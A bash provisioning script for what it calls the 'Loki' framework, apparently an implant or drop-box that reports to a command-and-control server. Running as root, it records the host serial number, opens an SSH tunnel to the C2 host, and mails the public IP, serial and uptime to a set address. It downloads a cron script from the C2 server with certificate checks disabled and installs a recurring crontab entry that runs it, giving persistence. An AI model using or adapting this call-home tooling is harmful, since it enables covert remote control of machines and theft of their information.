#!/bin/bash
###############################################################################
# provision.sh - This is the parent script for all of the other loki scripts.
#
# Requirements
#
# Mod History:
# 21 May 2019 - nju - created file from Loki framework
############################################################################### 



# check for root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

source config.sh

LOKIHOME=$(pwd)
# sed -i 's/^LOKIHOME="*"/LOKIHOME="$LOKIHOME"/g' config.sh
sed -i "s|^LOKIHOME.*$|LOKIHOME=$(pwd)|g" config.sh

MYNAME=$(dmidecode -s system-serial-number)
$ECHO $MYNAME > $LOKIHOME/SERIAL

# check for variables
## C2 Server
if [ -z "$C2" ]; then
	echo "C2 Server Not Specified"
	exit 1
fi
if [ -z "$DESTEMAIL" ]; then
	echo "Destination Email Not Specified"
	exit 1	
fi
if [ -z "$C2PROTO" ]; then
	echo "C2 Protocol Not Specified"
	exit 1
fi
## C2 Username
if [ -z $C2USR ]; then
	echo "C2 User Not Specified"
	exit 1
fi

# Set permissions on $LOKIHOME
$CHOWN $C2USER.$C2USER $LOKIHOME -R
$CHMOD g+wr $LOKIHOME -R

# Verify Network Connectivity and wait until we get it.  We can't do anything until
# we have network connectivity.
until curl -Is $C2PROTO$C2
  do
    echo "Waiting for Network"
	sleep .25
  done
$LOG "Network Up"

$SSH -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -N -f -C
WAN_IP=$(curl ifconfig.me)
SERIAL=$(dmidecode -s system-serial-number)
UPTIME=$(uptime)

echo "LAN IP = $LAN_IP " > $LOKIHOME/netinfo
echo "WAN IP = $WAN_IP" >> $LOKIHOME/netinfo

echo "===========================" >> $LOKIHOME/netinfo
echo "Serial = $SERIAL" >> $LOKIHOME/netinfo
echo "MAC = $MAC" >> $LOKIHOME/netinfo
echo "Uptime = $UPTIME" >> $LOKIHOME/netinfo

mail -s "PSA ONLINE" $DESTEMAIL < $LOKIHOME/netinfo

# Check for the Loki Home Directory
if ! [ -d "$LOKIHOME" ]; then 
	$LOG "Creating LOKIHOME ($LOKIHOME)"
    $MKDIR -p $LOKIHOME
fi
# Check for the Loki Cron File (we'll write to this)
if ! [ -f "$LOKIHOME/$MYNAME-cron.sh" ]; then
	$LOG "Loki Cron doesn't exist, creating $LOKIHOME/$MYNAME-cron.sh ($ECHO "" > $LOKIHOME/$MYNAME-cron.sh )"
	# This is the command file that the cron job will run
# Need some error checking here
	$WGET -O $LOKIHOME/$MYNAME-cron.sh --no-check-certificate $C2PROTO$C2/base-cron.sh
	$CHMOD +x $LOKIHOME/$MYNAME-cron.sh
fi




# check for cron job to check in and, if it isn't there, add it
$CRONTAB -u $C2USER -l | grep $MYNAME 
if [ $? == 1 ]; then 
  $LOG "No crontab found, Adding Crontab"
  echo "*/$CALLHOMEFREQ  * * * * $LOKIHOME/$MYNAME-cron.sh > /dev/null 2>&1" >> /var/spool/cron/crontabs/$C2USER
  $CHMOD 600 /var/spool/cron/crontabs/$C2USER
fi


# Check for required files

# check for network connection



# Run initial payload
## phone home
